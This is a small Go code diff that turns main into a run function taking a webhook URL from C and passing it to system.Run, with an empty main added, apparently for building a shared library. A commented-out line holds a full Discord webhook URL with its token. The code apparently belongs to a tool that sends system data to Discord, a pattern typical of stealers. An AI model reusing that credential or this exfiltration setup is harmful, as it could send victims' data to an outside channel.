@@ -7,7 +7,7 @@ import (
     "main.go/modules/system"
 )
 
-func main(arg *C.char) {
+func run(arg *C.char) {
 //	webhook := "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"
 
     webhook := C.GoString(arg)
@@ -19,3 +19,5 @@ func main(arg *C.char) {
 
 	system.Run(webhook)
 }
+
+func main() {}
